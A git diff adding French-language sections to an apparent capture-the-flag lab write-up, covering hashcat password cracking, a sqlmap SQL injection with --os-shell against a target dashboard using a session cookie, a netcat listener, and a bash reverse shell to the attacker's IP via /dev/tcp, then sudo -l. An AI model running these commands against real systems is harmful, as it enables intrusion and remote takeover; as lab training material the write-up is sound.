@@ -76,7 +76,7 @@ hashcat -a 0 -m 0 codeindex.txt ./rockyou.txt
 Je lance donc la commande et hashcat me dit que la liste n'est pas asser longue. Je relance donc:
 
 ```bash
-hashcat -a 0 -m 0 codoindex.txt /usr/share/seclists/Password/Common-Credentials/100k-most-used-password.txt
+hashcat -a 0 -m 0 codeindex.txt /usr/share/seclists/Password/Common-Credentials/100k-most-used-password.txt
 ```
 
 Et voila qu'il me donne le password tant voulu celui ci est !!!!!!! qwerty789 😈😈
@@ -86,3 +86,44 @@ Et la réponse a la question 5 est la!
 --- 
 ## Task 6
 
+Quelle est l'option qui peut etre passer a sqlmap pour prendre les commande durant une sql injection ? 
+
+```bash
+--os-shell
+```
+
+---
+## Task 07
+
+Il nous faut maintenan trouver un moyen de ce connecter afin de continuer les tache alors comment allons nous faire ? <br/>
+Une injection sql évidement car j'ai etait orienter vers ca mais comment procéder ? <br/>
+
+Dur dur une commande m'a était transmise pour faire un sqlmap
+```bash
+sqlmap -u 'http://[Ip de la cible]/dashboard.php?search=any+query' --cookie="PHPESSID=[valeur du cookie obtenue via cookie editor extension mozzila]"
+```
+
+Puis on retape la même chose avec:
+```bash
+--os-shell
+```
+
+Puis on ouvre un ncat sur le port 443:
+```bash
+nc -lvnp 443
+```
+
+Et finalement on envoi une commande qui nous permettra d'obetnir un shell stable:
+
+```bash
+bash -c bash -i >& /dev/tcp/[mon adress ip]/443 0>&1
+```
+
+Maintenant que je suis connecter je peut faire un:
+```bash
+sudo -l 
+```
+Pour obetnir la réponse a la question qui est :
+```bash
+
+```
